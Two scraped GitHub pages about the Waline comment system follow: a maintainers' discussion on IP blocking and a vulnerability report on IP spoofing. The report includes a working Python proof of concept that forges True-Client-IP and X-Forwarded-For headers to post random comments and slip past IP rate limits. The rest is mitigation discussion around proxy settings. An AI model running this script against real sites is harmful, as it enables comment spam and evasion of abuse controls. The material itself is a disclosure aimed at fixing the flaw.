=== Content from github.com_fe854498_20250114_195518.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Forgs%2Fwalinejs%2Fdiscussions%2F792)

[walinejs](/walinejs)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Forgs%2Fwalinejs%2Fdiscussions%2F792)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fdiscussions_fragments%2Fdiscussion_layout&source=header-repo&source_repo=walinejs%2Fwaline)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# [@walinejs Waline](/walinejs)

* [Overview](/walinejs)
* [Repositories](/orgs/walinejs/repositories)
* [Discussions](/orgs/walinejs/discussions)
* [Projects](/orgs/walinejs/projects)
* [Packages](/orgs/walinejs/packages)
* [People](/orgs/walinejs/people)

More

* [Overview](/walinejs)
* [Repositories](/orgs/walinejs/repositories)
* [Discussions](/orgs/walinejs/discussions)
* [Projects](/orgs/walinejs/projects)
* [Packages](/orgs/walinejs/packages)
* [People](/orgs/walinejs/people)

# Block mode for @waline/vercel #792

[Mister-Hope](/Mister-Hope)
started this conversation in
[Ideas](/orgs/walinejs/discussions/categories/ideas)

[Block mode for @waline/vercel](#top)
#792

[![@Mister-Hope](https://avatars.githubusercontent.com/u/33315834?s=40&v=4)
Mister-Hope](/Mister-Hope)

Feb 1, 2022
·
1 comments
·
11 replies

[Return to top](#top)

Discussion options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

## [Mister-Hope](/Mister-Hope) [Feb 1, 2022](#discussion-3846988) Maintainer

 -

| I am trying to find out a solution with [#785](https://github.com/walinejs/waline/issues/785). And here is my possible solution:   1. Add a `TRACKIP` env variable and default to false. 2. add `blockedIPS` in options 3. Edit code to make the console prints all th ips in `X-Forwarded-For` header and the remote addr when `TRACKIP` has values, and also stores theme in a local log file. (With also the api path like `comment` `visitor`) 4. edit the admin panel to let admin users be able to view the log on line. This should probaly come along with the native 5. Add a middleware beforeall services, if the request's `X-Forwarded-For` header or the send addr matches any of the `blockedIPS`, return 403 statuscode directly.  ---  Reason In most situations, the attackers should hold limited ips sending these request. (We are not facing large attacks like DDOS, if so , the user probably need a paid firewall).  The attacker's real ip should be one of the `X-Forwarded-For` ips or the connect ip. And when under high frequent attacks, it's easy to find his real ip. Users can block his ip by adding the nearest unchanged ip on right in `X-Forwarded-For` header. That should block the attackers.  More aggresively, we can also have a `SECURE` env variable, which will record all the ip in `X-Forwarded-For` header and block them with `IPQPS`, expect those in `permitedIPS`.  [@lizheming](https://github.com/lizheming) @ihackerx |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

## Replies: 1 comment · 11 replies

* [Oldest](/orgs/walinejs/discussions/792?sort=old)
* [Newest](/orgs/walinejs/discussions/792?sort=new)
* [Top](/orgs/walinejs/discussions/792?sort=top)

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

### [lizheming](/lizheming) [Feb 1, 2022](#discussioncomment-2088017) Maintainer

 -

| All request headers can be faked by user, including `X-Forwarded-For`. Recording is unmeaning if it can't be trusted.  If you watch the server code, you'll find server just get user's ip from `X-Forwarded-For` header. <https://github.com/koajs/koa/blob/master/lib/request.js#L421-L459> |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

11 replies

Show 6 previous replies

[![@Mister-Hope](https://avatars.githubusercontent.com/u/33315834?s=60&v=4)](/Mister-Hope)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [Mister-Hope](/Mister-Hope) [Feb 4, 2022](#discussioncomment-2108790) Maintainer Author

 -

| So if I am not misunderstanding, the test url is like stuation 4 where I mentioned above, while the proxy is actually doing the "by-pass" job, while simply reads "true-client-ip" and regard it as the real ip then added in the "x-forward-for" header, and hide the actually ip which connects it to the server side? |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@Mister-Hope](https://avatars.githubusercontent.com/u/33315834?s=60&v=4)](/Mister-Hope)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [Mister-Hope](/Mister-Hope) [Feb 4, 2022](#discussioncomment-2108794) Maintainer Author

 -

| Shouldn't it be some issues of the "reverse proxy" configuation? |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@Mister-Hope](https://avatars.githubusercontent.com/u/33315834?s=60&v=4)](/Mister-Hope)

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

#### [Mister-Hope](/Mister-Hope) [Feb 4, 2022](#discussioncomment-2108838) Maintainer Author

 -

| Update:  After speding some time reading the docs, here is my conclusion:  If it's vercel default behavior, then vercel is hiding the connect ip itself, and try to give "the real user ip". Probably with <https://nginx.org/en/docs/http/ngx_http_realip_module.html>  While the default behavior of nginx should be something like this, since `$remote_addr` should be the proxy ip (or the connection ip by default), `req.connect.remoteAddress` should be actual ip.  ``` location / {     proxy_pass       http://localhost:8000;     proxy_set_header Host      $host;     proxy_set_header X-Real-IP $remote_addr; }  ```  If so, that's true there is nothing we can do about it on vercel. But we should be able to block these requests on a self hold env. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@Mister-Hope](https://avatars.githubusercontent.com/u/33315834?s=60&v=4)](/Mister-Hope)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [Mister-Hope](/Mister-Hope) [Feb 4, 2022](#discussioncomment-2108854) Maintainer Author

 -

| cc @ihackerx |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@lizheming](https://avatars.githubusercontent.com/u/424491?s=60&v=4)](/lizheming)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [lizheming](/lizheming) [Feb 4, 2022](#discussioncomment-2109039) Maintainer

 -

| In self host mode, we can set `maxIpsCount` to proxy server layers to get a real ip. <https://koajs.com/#settings>  ``` const Waline = require('@waline/vercel'); const Application = new Waline({}); think.app.maxIpsCount = <number>;  module.exports = Application;  ``` |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Forgs%2Fwalinejs%2Fdiscussions%2F792)

Category

[💡

Ideas](/orgs/walinejs/discussions/categories/ideas)

Labels

None yet

2 participants

[![@Mister-Hope](https://avatars.githubusercontent.com/u/33315834?s=48&v=4)](/Mister-Hope) [![@lizheming](https://avatars.githubusercontent.com/u/424491?s=48&v=4)](/lizheming)

Heading

Bold

Italic

Quote

Code

Link

---

Menu

* Heading
* Bold
* Italic
* Quote
* Code
* Link
* Numbered list
* Unordered list
* Task list
* Attach files
* Mention
* Reference

# Select a reply

 Loading

  [Create a new saved reply](/settings/replies?return_to=1)

 👍
1
  reacted with thumbs up emoji

 👎
1
  reacted with thumbs down emoji

 😄
1
  reacted with laugh emoji

 🎉
1
  reacted with hooray emoji

 😕
1
  reacted with confused emoji

 ❤️
1
  reacted with heart emoji

 🚀
1
  reacted with rocket emoji

 👀
1
  reacted with eyes emoji

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_dc2fd6ab_20250114_195520.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwalinejs%2Fwaline%2Fissues%2F785)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwalinejs%2Fwaline%2Fissues%2F785)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=walinejs%2Fwaline)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[walinejs](/walinejs)
/
**[waline](/walinejs/waline)**
Public

* [Notifications](/login?return_to=%2Fwalinejs%2Fwaline) You must be signed in to change notification settings
* [Fork
  412](/login?return_to=%2Fwalinejs%2Fwaline)
* [Star
   2.4k](/login?return_to=%2Fwalinejs%2Fwaline)

* [Code](/walinejs/waline)
* [Issues
  44](/walinejs/waline/issues)
* [Pull requests
  13](/walinejs/waline/pulls)
* [Discussions](/walinejs/waline/discussions)
* [Actions](/walinejs/waline/actions)
* [Security](/walinejs/waline/security)
* [Insights](/walinejs/waline/pulse)

Additional navigation options

* [Code](/walinejs/waline)
* [Issues](/walinejs/waline/issues)
* [Pull requests](/walinejs/waline/pulls)
* [Discussions](/walinejs/waline/discussions)
* [Actions](/walinejs/waline/actions)
* [Security](/walinejs/waline/security)
* [Insights](/walinejs/waline/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fwalinejs%2Fwaline%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fwalinejs%2Fwaline%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [Bug]: waline fake any ip vulnerability #785

Closed

[ghost](/ghost) opened this issue
Jan 30, 2022
· 7 comments

Closed

# [[Bug]: waline fake any ip vulnerability](#top) #785

[ghost](/ghost) opened this issue
Jan 30, 2022
· 7 comments

Labels
[discussion](/walinejs/waline/labels/discussion)
Question or dicussion
[Needs more info](/walinejs/waline/labels/Needs%20more%20info)
Further information is needed
[waiting for response](/walinejs/waline/labels/waiting%20for%20response)
Reply is wanted

## Comments

[![@ghost](https://avatars.githubusercontent.com/u/10137?s=80&v=4)](/ghost)

Copy link

### **[ghost](/ghost)** commented [Jan 30, 2022](#issue-1118374553) • edited by ghost Loading

| 问题描述 | Describe the bugwaline-fake-any-ip-poc A Proof-Of-Concept for the recently found [waline](https://github.com/walinejs/waline) fake any ip vulnerability.  In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it. Proof-of-concept (POC) As a PoC we have created a python file that automates the process. Requirements: ``` pip install requests ``` Usage: ``` python3 poc.py ``` Source: ``` #######  poc.py #======= Disclaimer: ========================================================================================# # THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" # AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE # IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE # DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE # FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL # DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR # SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER # CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, # OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE # OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. #===========================================================================================================# import requests import random  def getRandStr(len):   str=""   dict = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"   for i in range(len):     str = str + random.choice(dict)   return str  attack_url = "https://waline-test-poc.vercel.app" # This is an attack url   fake_ip = "This is a fake IP " + getRandStr(6) # This is a fake IP or any other string  headers ={} headers['User-Agent']="Mozilla/5.0 test " + getRandStr(6) headers['X-Forwarded-For']= "0.0.0.0" headers['True-Client-IP']= fake_ip # fake ip  data={   "comment": "test comment " + getRandStr(6),   "nick": "test nick " + getRandStr(6),   "mail": getRandStr(6) + "@test.com",   "link": "https://" + getRandStr(6) + ".com",   "ua": "Mozilla/5.0 test " + getRandStr(6),   "url": "/", } res=requests.post(url = attack_url + "/comment", headers = headers, data = data) print(res.text) ``` Result: [0](https://user-images.githubusercontent.com/98643060/155665193-5d2d7879-ee57-4bbd-b1d6-8f23e18ab0b3.png) Our vulnerable application waline deploy:   * @waline/vercel 1.6.0 * @waline/client 1.5.2   data store:   * LeannCloud   get started:  <https://waline.js.org/guide/get-started.html> Influence IP-based comment posting frequency limits IPQPS may be rendered useless.  This vulnerability can be used to fake the IP address and bypass the IP frequency limit of the comment system software(waline), so that the comment system administrator cannot accurately obtain the IP address of the sender. Reason This vulnerability is usually caused by a misconfiguration on the server side. References  * [#785](https://github.com/walinejs/waline/issues/785) * [#792](https://github.com/walinejs/waline/discussions/792)  Exploit in the field According to the issues of Github of the project waline, from July 18 to July 20, 2021, an attacker bombarded all websites using Waline by Posting spam comments with faked IP addresses, so it is speculated that this vulnerability has been exploited in the field.   * [#786](https://github.com/vuepress-theme-hope/vuepress-theme-hope/discussions/786) * [#430](https://github.com/walinejs/waline/issues/430) * [#424](https://github.com/walinejs/waline/issues/424) * [#427](https://github.com/walinejs/waline/discussions/427)  Solutions Software maintainers have provided a solution to this vulnerability.  There is nothing we can do about it on vercel. But we should be able to block these requests on a self hold env.([#792 (reply in thread)](https://github.com/orgs/walinejs/discussions/792#discussioncomment-2108838))  In self host mode, we can set maxIpsCount to proxy server layers to get a real ip. <https://koajs.com/#settings> ([#792 (reply in thread)](https://github.com/orgs/walinejs/discussions/792#discussioncomment-2109039)) Disclaimer This repository is not intended to be a one-click exploit to waline fake any ip vulnerability. The purpose of this project is to help people learn about this vulnerability, and perhaps test their own applications.  Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it. LICENSE ``` BSD 3-Clause License  Copyright (c) 2022, ihackerx All rights reserved.  Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:  1. Redistributions of source code must retain the above copyright notice, this    list of conditions and the following disclaimer.  2. Redistributions in binary form must reproduce the above copyright notice,    this list of conditions and the following disclaimer in the documentation    and/or other materials provided with the distribution.  3. Neither the name of the copyright holder nor the names of its    contributors may be used to endorse or promote products derived from    this software without specific prior written permission.  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.  ``` 问题网站 | Website URL <https://waline.js.org> 服务部署在哪里？ | Where your waline deploy? Vercel (Default) 数据存储在哪里？| Where your comment data store? LeanCloud(<https://leancloud.app>) |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

![@ghost](https://avatars.githubusercontent.com/u/10137?s=32&v=4)
**ghost**
added
the
[bug](/walinejs/waline/labels/bug)
Something isn't working
label
[Jan 30, 2022](#event-5975713160)

[![@lizheming](https://avatars.githubusercontent.com/u/424491?s=80&u=7f494e691aa670c0bc246e43d22fdd76a60ef322&v=4)](/lizheming)

Copy link

Collaborator

### **[lizheming](/lizheming)** commented [Jan 30, 2022](#issuecomment-1025050233)

| As I know, there has no way to get user ip from client trustly. And `IPQPS` just works for some freshman hacker that I have told waline user at the user group. Do you have any great idea about `IPQPS` to avoid the vulnerability? I'll implement it if it works. |
| --- |

All reactions

Sorry, something went wrong.

[![@Mister-Hope](https://avatars.githubusercontent.com/u/33315834?s=80&u=865b18c7a32f601dcb11aa26ef46bc8b78e909e9&v=4)](/Mister-Hope)

Copy link

Member

### **[Mister-Hope](/Mister-Hope)** commented [Jan 30, 2022](#issuecomment-1025183069)

| Can we get the remoteIP and ban the remoteIp together?  If necessary, ban all the ips in `x-forwarded-for` . can't that work? |
| --- |

All reactions

Sorry, something went wrong.

[![@Mister-Hope](https://avatars.githubusercontent.com/u/33315834?s=80&u=865b18c7a32f601dcb11aa26ef46bc8b78e909e9&v=4)](/Mister-Hope)

Copy link

Member

### **[Mister-Hope](/Mister-Hope)** commented [Jan 30, 2022](#issuecomment-1025183661) • edited Loading

| (I majored in physics, though), but I had a NRCE 3 test. A tcp connet needs 3 handshake, so at least the remoteIP can not be faked in my mind.  Is there any difficulties blocking it? (Such as can not get it in Node?) Or are there side effects doing that? |
| --- |

All reactions

Sorry, something went wrong.

[![@lizheming](https://avatars.githubusercontent.com/u/424491?s=40&u=7f494e691aa670c0bc246e43d22fdd76a60ef322&v=4)](/lizheming)
[lizheming](/lizheming)
added
[discussion](/walinejs/waline/labels/discussion)
Question or dicussion
[Needs more info](/walinejs/waline/labels/Needs%20more%20info)
Further information is needed
[waiting for response](/walinejs/waline/labels/waiting%20for%20response)
Reply is wanted
and removed
[bug](/walinejs/waline/labels/bug)
Something isn't working
labels
[Feb 5, 2022](#event-6013825740)

![@ghost](https://avatars.githubusercontent.com/u/10137?s=32&v=4)
**ghost**
closed this as [completed](/walinejs/waline/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Feb 6, 2022](#event-6014567693)

![@ghost](https://avatars.githubusercontent.com/u/10137?s=32&v=4)
**ghost**
reopened this
[Feb 6, 2022](#event-6014979967)

[![@ghost](https://avatars.githubusercontent.com/u/10137?s=80&v=4)](/ghost)

Copy link

Author

### **[ghost](/ghost)** commented [Feb 6, 2022](#issuecomment-1030941072)

| This vulnerability is usually caused by a misconfiguration on the server side.  Because IP frequency limits depend on obtaining the correct IP, how to obtain the correct IP rather than IPQPS is the fundamental solution to the problem.  It's easy to fake X-Forwarded-For, and it should be used with great care.  Get the client IP for the direct TCP connection using RemoteAddr. If there are multiple tiers of proxies, RemoteAddr must be configured on the server directly connected to the external server, and X-Forwarded-For must be configured on the inner server. Otherwise, the inner server overwrites the real IP address of the client.  Software maintainers have provided a solution to this vulnerability.  There is nothing we can do about it on vercel. But we should be able to block these requests on a self hold env.([#792 (reply in thread)](https://github.com/orgs/walinejs/discussions/792#discussioncomment-2108838))  In self host mode, we can set maxIpsCount to proxy server layers to get a real ip. ([#792 (reply in thread)](https://github.com/orgs/walinejs/discussions/792#discussioncomment-2109039)) |
| --- |

All reactions

Sorry, something went wrong.

[![@ghost](https://avatars.githubusercontent.com/u/10137?s=80&v=4)](/ghost)

Copy link

Author

### **[ghost](/ghost)** commented [Feb 7, 2022](#issuecomment-1030997498) • edited by ghost Loading

| Here's another way to do it. Set a layer of CDN or firewall outside the application to fetch RemoteAddr. X-forwarded-for is used inside the application. such as [#429](https://github.com/walinejs/waline/issues/429) [#405](https://github.com/orgs/walinejs/discussions/405) (cc [@ocoke](https://github.com/ocoke) [@karuboniru](https://github.com/karuboniru)) |
| --- |

All reactions

Sorry, something went wrong.

[![@ghost](https://avatars.githubusercontent.com/u/10137?s=80&v=4)](/ghost)

Copy link

Author

### **[ghost](/ghost)** commented [Feb 25, 2022](#issuecomment-1050567480)

| There is no more information here, I will close it, if you have other solutions please leave a message below. |
| --- |

All reactions

Sorry, something went wrong.

![@ghost](https://avatars.githubusercontent.com/u/10137?s=32&v=4)
**ghost**
closed this as [completed](/walinejs/waline/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Feb 25, 2022](#event-6137070048)

[![@lizheming](https://avatars.githubusercontent.com/u/424491?s=80&u=7f494e691aa670c0bc246e43d22fdd76a60ef322&v=4)](/lizheming)

Copy link

Collaborator

### **[lizheming](/lizheming)** commented [Mar 13, 2022](#issuecomment-1066060295)

| Good News! It seems vercel has fixed the bug now. User can not fake ip by `true-client-ip` header.  [image](https://user-images.githubusercontent.com/424491/158053222-5b2cab2c-6777-4d60-8c53-1a67384baa30.png) |
| --- |

All reactions

Sorry, something went wrong.

 This issue was **closed**.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fwalinejs%2Fwaline%2Fissues%2F785)

Assignees

No one assigned

Labels

[discussion](/walinejs/waline/labels/discussion)
Question or dicussion
[Needs more info](/walinejs/waline/labels/Needs%20more%20info)
Further information is needed
[waiting for response](/walinejs/waline/labels/waiting%20for%20response)
Reply is wanted

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@lizheming](https://avatars.githubusercontent.com/u/424491?s=52&v=4)](/lizheming) [![@Mister-Hope](https://avatars.githubusercontent.com/u/33315834?s=52&v=4)](/Mister-Hope)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


